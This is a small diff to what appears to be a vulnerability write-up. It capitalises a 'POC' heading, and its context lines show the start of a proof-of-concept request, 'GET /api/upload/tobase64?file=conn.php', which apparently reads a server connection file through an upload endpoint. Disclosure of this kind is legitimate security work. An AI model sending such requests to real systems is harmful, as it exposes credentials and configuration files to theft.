@@ -8,7 +8,7 @@
 "/public/style/admin/js/jquery.min.js"
 ```
 
-## poc
+## POC
 
 ```php
 GET /api/upload/tobase64?file=conn.php HTTP/1.1
